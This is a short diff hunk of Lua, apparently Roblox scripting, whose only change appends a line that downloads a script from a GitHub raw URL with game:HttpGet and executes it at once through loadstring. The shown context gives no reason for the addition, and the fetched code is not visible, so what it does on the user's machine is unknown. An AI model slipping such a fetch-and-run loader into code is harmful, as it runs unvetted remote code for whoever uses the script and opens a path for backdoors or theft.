@@ -32,6 +32,7 @@ until getfenv().testing
 getfenv().testing = nil
 end
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Marco8642/science/refs/heads/main/testing%20cats"))()
 
 
 ]])
